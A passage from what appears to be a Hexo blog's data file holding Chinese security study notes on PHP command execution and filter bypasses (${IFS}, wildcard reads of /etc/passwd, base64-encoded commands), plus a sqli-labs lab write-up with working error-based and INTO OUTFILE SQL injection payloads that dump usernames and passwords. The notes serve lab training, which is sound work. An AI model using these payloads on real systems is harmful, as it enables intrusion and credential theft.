class=\"headerlink\" title=\"2)&amp;命令连接符\"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>\n<p>id&amp;whoami前后命令都会执行</p>\n<h5 id=\"3-amp-amp-命令连接符\"><a href=\"#3-amp-amp-命令连接符\" class=\"headerlink\" title=\"3)&amp;&amp;命令连接符\"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>\n<h5 id=\"4-命令连接符-管道符\"><a href=\"#4-命令连接符-管道符\" class=\"headerlink\" title=\"4)|命令连接符(管道符)\"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>\n<h5 id=\"5-命令连接符\"><a href=\"#5-命令连接符\" class=\"headerlink\" title=\"5||命令连接符\"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>\n<h3 id=\"命令执行绕过\"><a href=\"#命令执行绕过\" class=\"headerlink\" title=\"命令执行绕过\"></a>命令执行绕过</h3><h4 id=\"1-绕过空格过滤\"><a href=\"#1-绕过空格过滤\" class=\"headerlink\" title=\"1.绕过空格过滤\"></a>1.绕过空格过滤</h4><h5 id=\"1-IFS-绕过\"><a href=\"#1-IFS-绕过\" class=\"headerlink\" title=\"1)${IFS}绕过\"></a>1)${IFS}绕过</h5><p>$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号</p>\n<h5 id=\"2-IFS-9绕过\"><a href=\"#2-IFS-9绕过\" class=\"headerlink\" title=\"2)$IFS$9绕过\"></a>2)$IFS$9绕过</h5><h5 id=\"3-制表符绕过\"><a href=\"#3-制表符绕过\" class=\"headerlink\" title=\"3)制表符绕过\"></a>3)制表符绕过</h5><p>%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤</p>\n<h5 id=\"4-绕过\"><a href=\"#4-绕过\" class=\"headerlink\" title=\"4){ }绕过\"></a>4){ }绕过</h5><p>空格过滤可以用{ }绕过,例如</p>\n<p>{cat,index.php}</p>\n<h5 id=\"5-lt-绕过\"><a href=\"#5-lt-绕过\" class=\"headerlink\" title=\"5)&lt;绕过\"></a>5)&lt;绕过</h5><p>例如cat&lt;index.php</p>\n<h4 id=\"2-绕过关键字过滤\"><a href=\"#2-绕过关键字过滤\" class=\"headerlink\" title=\"2.绕过关键字过滤\"></a>2.绕过关键字过滤</h4><p><strong>利用反引号绕过``包裹的内容在php中会被当成系统命令执行</strong></p>\n<h5 id=\"1-变量拼接绕过\"><a href=\"#1-变量拼接绕过\" class=\"headerlink\" title=\"1)变量拼接绕过\"></a>1)变量拼接绕过</h5><p>linux支持变量赋值,可以通过变量拼接来绕过过滤规则</p>\n<p>例如</p>\n<p>$a=c;$b=at;$a$b index.php</p>\n<h5 id=\"2-空变量绕过\"><a href=\"#2-空变量绕过\" class=\"headerlink\" title=\"2)空变量绕过\"></a>2)空变量绕过</h5><p>例如,可以通过空变量绕过cat命令过滤</p>\n<p>ca${x}t index.php</p>\n<h5 id=\"3-系统变量绕过\"><a href=\"#3-系统变量绕过\" class=\"headerlink\" title=\"3)系统变量绕过\"></a>3)系统变量绕过</h5><p>${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤</p>\n<h5 id=\"4-绕过-1\"><a href=\"#4-绕过-1\" class=\"headerlink\" title=\"4)\\绕过\"></a>4)\\绕过</h5><p>可以通过c\\a\\t index.php绕过cat命令过滤</p>\n<h5 id=\"5-通配符绕过-简单正则\"><a href=\"#5-通配符绕过-简单正则\" class=\"headerlink\" title=\"5)通配符绕过(简单正则)\"></a>5)通配符绕过(简单正则)</h5><p>linux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符</p>\n<p>通配符规则如下:</p>\n<ul>\n<li>*表示0到多个任意字符</li>\n<li>?代表一个任意字符</li>\n<li>[ ]内为字符范围,代表该字符范围中的任意一个字符</li>\n</ul>\n<p>例如对于/etc/passwd可以使用/???/???sw?来绕过</p>\n<h5 id=\"6-shell反弹绕过\"><a href=\"#6-shell反弹绕过\" class=\"headerlink\" title=\"6)shell反弹绕过\"></a>6)shell反弹绕过</h5><h5 id=\"7-Base64编码绕过\"><a href=\"#7-Base64编码绕过\" class=\"headerlink\" title=\"7)Base64编码绕过\"></a>7)Base64编码绕过</h5><p>利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;aWQ=&quot;|base64 -d</span><br></pre></td></tr></table></figure>\n\n<p>原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行</p>\n<h5 id=\"8-利用expr和awk绕过\"><a href=\"#8-利用expr和awk绕过\" class=\"headerlink\" title=\"8)利用expr和awk绕过\"></a>8)利用expr和awk绕过</h5><p>通过expr和awk命令从其他的文件中获取字符并进行命令构造</p>\n<p>例如</p>\n<h5 id=\"9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果\"><a href=\"#9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果\" class=\"headerlink\" title=\"9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果\"></a>9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果</h5>","site":{"data":{}},"excerpt":"<h3 id=\"PHP常见的命令执行函数和运算符\"><a href=\"#PHP常见的命令执行函数和运算符\" class=\"headerlink\" title=\"PHP常见的命令执行函数和运算符\"></a>PHP常见的命令执行函数和运算符","more":"</h3><h5 id=\"1-system-函数\"><a href=\"#1-system-函数\" class=\"headerlink\" title=\"1.system()函数\"></a>1.system()函数</h5><p>用于执行外部程序,并且显示输出</p>\n<p>system(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"2-exec函数\"><a href=\"#2-exec函数\" class=\"headerlink\" title=\"2.exec函数\"></a>2.exec函数</h5><p>用于执行一个外部程序, 并不会自动输出,需要加echo</p>\n<p>echo exec(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"3-shell-exec函数\"><a href=\"#3-shell-exec函数\" class=\"headerlink\" title=\"3.shell_exec函数\"></a>3.shell_exec函数</h5><p>通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo</p>\n<p>echo shell_exec(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"4-passthru函数\"><a href=\"#4-passthru函数\" class=\"headerlink\" title=\"4.passthru函数\"></a>4.passthru函数</h5><p>用于执行外部程序并且显示原始输出</p>\n<p>passthru(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"5-popen函数\"><a href=\"#5-popen函数\" class=\"headerlink\" title=\"5.popen函数\"></a>5.popen函数</h5><p>popen函数用于打开进程文件指针,用法如下:</p>\n<p>resource.popen(string $command,string $mode)</p>\n<p>例如</p>\n<p>popen(“touch test.txt”,”r”);执行该代码后,会在当前目录下创建text.txt文件</p>\n<h5 id=\"6-proc-popen\"><a href=\"#6-proc-popen\" class=\"headerlink\" title=\"6.proc_popen\"></a>6.proc_popen</h5><p>用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版</p>\n<h5 id=\"7-反单引号\"><a href=\"#7-反单引号\" class=\"headerlink\" title=\"7.反单引号\"></a>7.反单引号</h5><p>反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回</p>\n<p>例如</p>\n<p>echo `whoami`;</p>\n<p>root</p>\n<h4 id=\"Windows下的命令连接符\"><a href=\"#Windows下的命令连接符\" class=\"headerlink\" title=\"Windows下的命令连接符\"></a>Windows下的命令连接符</h4><h5 id=\"1-amp-命令连接符\"><a href=\"#1-amp-命令连接符\" class=\"headerlink\" title=\"1)&amp;命令连接符\"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>\n<h5 id=\"2-amp-amp-命令连接符\"><a href=\"#2-amp-amp-命令连接符\" class=\"headerlink\" title=\"2)&amp;&amp;命令连接符\"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>\n<h5 id=\"3-命令连接符\"><a href=\"#3-命令连接符\" class=\"headerlink\" title=\"3)|命令连接符\"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>\n<p>|前面的语句为真,则执行|后面的语句</p>\n<h5 id=\"4-命令连接符\"><a href=\"#4-命令连接符\" class=\"headerlink\" title=\"4)||命令连接符\"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>\n<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>\n<h4 id=\"linux下的命令连接符\"><a href=\"#linux下的命令连接符\" class=\"headerlink\" title=\"linux下的命令连接符\"></a>linux下的命令连接符</h4><h5 id=\"1-命令连接符\"><a href=\"#1-命令连接符\" class=\"headerlink\" title=\"1);命令连接符\"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>\n<h5 id=\"2-amp-命令连接符\"><a href=\"#2-amp-命令连接符\" class=\"headerlink\" title=\"2)&amp;命令连接符\"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>\n<p>id&amp;whoami前后命令都会执行</p>\n<h5 id=\"3-amp-amp-命令连接符\"><a href=\"#3-amp-amp-命令连接符\" class=\"headerlink\" title=\"3)&amp;&amp;命令连接符\"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>\n<h5 id=\"4-命令连接符-管道符\"><a href=\"#4-命令连接符-管道符\" class=\"headerlink\" title=\"4)|命令连接符(管道符)\"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>\n<h5 id=\"5-命令连接符\"><a href=\"#5-命令连接符\" class=\"headerlink\" title=\"5||命令连接符\"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>\n<h3 id=\"命令执行绕过\"><a href=\"#命令执行绕过\" class=\"headerlink\" title=\"命令执行绕过\"></a>命令执行绕过</h3><h4 id=\"1-绕过空格过滤\"><a href=\"#1-绕过空格过滤\" class=\"headerlink\" title=\"1.绕过空格过滤\"></a>1.绕过空格过滤</h4><h5 id=\"1-IFS-绕过\"><a href=\"#1-IFS-绕过\" class=\"headerlink\" title=\"1)${IFS}绕过\"></a>1)${IFS}绕过</h5><p>$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号</p>\n<h5 id=\"2-IFS-9绕过\"><a href=\"#2-IFS-9绕过\" class=\"headerlink\" title=\"2)$IFS$9绕过\"></a>2)$IFS$9绕过</h5><h5 id=\"3-制表符绕过\"><a href=\"#3-制表符绕过\" class=\"headerlink\" title=\"3)制表符绕过\"></a>3)制表符绕过</h5><p>%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤</p>\n<h5 id=\"4-绕过\"><a href=\"#4-绕过\" class=\"headerlink\" title=\"4){ }绕过\"></a>4){ }绕过</h5><p>空格过滤可以用{ }绕过,例如</p>\n<p>{cat,index.php}</p>\n<h5 id=\"5-lt-绕过\"><a href=\"#5-lt-绕过\" class=\"headerlink\" title=\"5)&lt;绕过\"></a>5)&lt;绕过</h5><p>例如cat&lt;index.php</p>\n<h4 id=\"2-绕过关键字过滤\"><a href=\"#2-绕过关键字过滤\" class=\"headerlink\" title=\"2.绕过关键字过滤\"></a>2.绕过关键字过滤</h4><p><strong>利用反引号绕过``包裹的内容在php中会被当成系统命令执行</strong></p>\n<h5 id=\"1-变量拼接绕过\"><a href=\"#1-变量拼接绕过\" class=\"headerlink\" title=\"1)变量拼接绕过\"></a>1)变量拼接绕过</h5><p>linux支持变量赋值,可以通过变量拼接来绕过过滤规则</p>\n<p>例如</p>\n<p>$a=c;$b=at;$a$b index.php</p>\n<h5 id=\"2-空变量绕过\"><a href=\"#2-空变量绕过\" class=\"headerlink\" title=\"2)空变量绕过\"></a>2)空变量绕过</h5><p>例如,可以通过空变量绕过cat命令过滤</p>\n<p>ca${x}t index.php</p>\n<h5 id=\"3-系统变量绕过\"><a href=\"#3-系统变量绕过\" class=\"headerlink\" title=\"3)系统变量绕过\"></a>3)系统变量绕过</h5><p>${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤</p>\n<h5 id=\"4-绕过-1\"><a href=\"#4-绕过-1\" class=\"headerlink\" title=\"4)\\绕过\"></a>4)\\绕过</h5><p>可以通过c\\a\\t index.php绕过cat命令过滤</p>\n<h5 id=\"5-通配符绕过-简单正则\"><a href=\"#5-通配符绕过-简单正则\" class=\"headerlink\" title=\"5)通配符绕过(简单正则)\"></a>5)通配符绕过(简单正则)</h5><p>linux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符</p>\n<p>通配符规则如下:</p>\n<ul>\n<li>*表示0到多个任意字符</li>\n<li>?代表一个任意字符</li>\n<li>[ ]内为字符范围,代表该字符范围中的任意一个字符</li>\n</ul>\n<p>例如对于/etc/passwd可以使用/???/???sw?来绕过</p>\n<h5 id=\"6-shell反弹绕过\"><a href=\"#6-shell反弹绕过\" class=\"headerlink\" title=\"6)shell反弹绕过\"></a>6)shell反弹绕过</h5><h5 id=\"7-Base64编码绕过\"><a href=\"#7-Base64编码绕过\" class=\"headerlink\" title=\"7)Base64编码绕过\"></a>7)Base64编码绕过</h5><p>利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;aWQ=&quot;|base64 -d</span><br></pre></td></tr></table></figure>\n\n<p>原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行</p>\n<h5 id=\"8-利用expr和awk绕过\"><a href=\"#8-利用expr和awk绕过\" class=\"headerlink\" title=\"8)利用expr和awk绕过\"></a>8)利用expr和awk绕过</h5><p>通过expr和awk命令从其他的文件中获取字符并进行命令构造</p>\n<p>例如</p>\n<h5 id=\"9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果\"><a href=\"#9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果\" class=\"headerlink\" title=\"9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果\"></a>9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果</h5>"},{"title":"sqli-labs","date":"2021-12-02T08:16:28.000Z","typora-root-url":"..","description":"sqli-labs记录","_content":"\nsqli-labs\n\nless3   less4\n\nless4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入\n\n通过单引号报错信息\n\n推测可能在接收参数后添加了( )包裹了id参数\n\n![](/images/sqli-labs/Image.png)\n\n![](/images/sqli-labs/Image%20%5B1%5D.png)\n\n通过构造闭合即可\n\nid=1')%23\n\n接下来用union联合注入即可\n\nless4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1\") and 1=1%23\n\n根据报错注入公式,开始操作\n\n库名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select database())))%23\n```\n\n表名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='security')))%23\n```\n\n列名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')))%23\n```\n\n利用right和left函数相互配合爆出字段名s\n\n```sql\nid=1\")and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23\n```\n\n如法炮制,爆数据即可\n\n##### less 7\n\n本题经过尝试得到后台为((' '))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入\n1.要使用outfile首先要知道绝对路径\n\n通过之前的less进行查询\n\n@@basedir是mysql安装路径\n\n@@datadir是数据库路径\n\n![](/images/sqli-labs/1.png)\n\n2.读写权限测试mysql快速查看读写权限\n\n```sql\nshow variables like '%secure%';\n```\n\n![](/images/sqli-labs/2.png)\n\n```sql\nid=1')) and (select count(*) from mysql.user)>0%23\n```\n\n如果返回正常,则说明有读写权限\n\n![](/images/sqli-labs/3.png)\n\n其次在linux中还需要mysql用户对目录有w权限才能写入\n\n```sql\nid=1%27))%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema%20=%27security%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/2.txt%27%23\n```\n\n通过上述语句查询表名,写入到2.txt\n\n![](/images/sqli-labs/4.png)\n\n貌似文件只能新建,不能重复写入\n查询列名\n\n```sql\nid=1%27))%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/3.txt%27%23\n```\n\n查询数据\n\n```sql\nid=1%27))%20union%20select%201,username,password%20from%20security.users%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/4.txt%27%23\n```\n\n","source":"_posts/sqli-labs.md","raw":"---\ntitle: sqli-labs\ndate: 2021-12-02 16:16:28\ntags: sqli-labs\ncategories: sqli\ntypora-root-url: ..\ndescription: sqli-labs记录\n---\n\nsqli-labs\n\nless3   less4\n\nless4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入\n\n通过单引号报错信息\n\n推测可能在接收参数后添加了( )包裹了id参数\n\n![](/images/sqli-labs/Image.png)\n\n![](/images/sqli-labs/Image%20%5B1%5D.png)\n\n通过构造闭合即可\n\nid=1')%23\n\n接下来用union联合注入即可\n\nless4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1\") and 1=1%23\n\n根据报错注入公式,开始操作\n\n库名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select database())))%23\n```\n\n表名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='security')))%23\n```\n\n列名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')))%23\n```\n\n利用right和left函数相互配合爆出字段名s\n\n```sql\nid=1\")and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23\n```\n\n如法炮制,爆数据即可\n\n##### less 7\n\n本题经过尝试得到后台为((' '))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入\n1.要使用outfile首先要知道绝对路径\n\n通过之前的less进行查询\n\n@@basedir是mysql安装路径\n\n@@datadir是数据库路径\n\n![](/images/sqli-labs/1.png)\n\n2.读写权限测试mysql快速查看读写权限\n\n```sql\nshow variables like '%secure%';\n```\n\n![](/images/sqli-labs/2.png)\n\n```sql\nid=1')) and (select count(*) from mysql.user)>0%23\n```\n\n如果返回正常,则说明有读写权限\n\n![](/images/sqli-labs/3.png)\n\n其次在linux中还需要mysql用户对目录有w权限才能写入\n\n```sql\nid=1%27))%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema%20=%27security%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/2.txt%27%23\n```\n\n通过上述语句查询表名,写入到2.txt\n\n![](/images/sqli-labs/4.png)\n\n貌似文件只能新建,不能重复写入\n查询列名\n\n```sql\nid=1%27))%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/3.txt%27%23\n```\n\n查询数据\n\n```sql\nid=1%27))%20union%20select%201,username,password%20from%20security.users%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/4.txt%27%23\n```\n\n","slug":"sqli-labs","published":1,"updated":"2022-01-07T13:31:06.120Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9n8001zgsw94ydu095q","content":"<p>sqli-labs</p>\n<p>less3   less4</p>\n<p>less4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入</p>\n<p>通过单引号报错信息</p>\n<p>推测可能在接收参数后添加了( )包裹了id参数</p>\n<p><img src=\"/images/sqli-labs/Image.png\"></p>\n<p><img src=\"/images/sqli-labs/Image%20%5B1%5D.png\"></p>\n<p>通过构造闭合即可</p>\n<p>id=1’)%23</p>\n<p>接下来用union联合注入即可</p>\n<p>less4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1”) and 1=1%23</p>\n<p>根据报错注入公式,开始操作</p>\n<p>库名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select database())))%23</span><br></pre></td></tr></table></figure>\n\n<p>表名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>利用right和left函数相互配合爆出字段名s</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23</span><br></pre></td></tr></table></figure>\n\n<p>如法炮制,爆数据即可</p>\n<h5 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h5><p>本题经过尝试得到后台为((‘ ‘))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入<br>1.要使用outfile首先要知道绝对路径</p>\n<p>通过之前的less进行查询</p>\n<p>@@basedir是mysql安装路径</p>\n<p>@@datadir是数据库路径</p>\n<p><img src=\"/images/sqli-labs/1.png\"></p>\n<p>2.读写权限测试mysql快速查看读写权限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> variables <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqli-labs/2.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;)) and (select count(*) from mysql.user)&gt;0%23</span></span><br></pre></td></tr></table></figure>\n\n<p>如果返回正常,则说明有读写权限</p>\n<p><img src=\"/images/sqli-labs/3.png\"></p>\n<p>其次在linux中还需要mysql用户对目录有w权限才能写入</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.tables<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_schema<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span>security<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">2.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>通过上述语句查询表名,写入到2.txt</p>\n<p><img src=\"/images/sqli-labs/4.png\"></p>\n<p>貌似文件只能新建,不能重复写入<br>查询列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,column_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.columns<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span>users<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">3.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>查询数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,username,password<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>security.users<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">4.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span 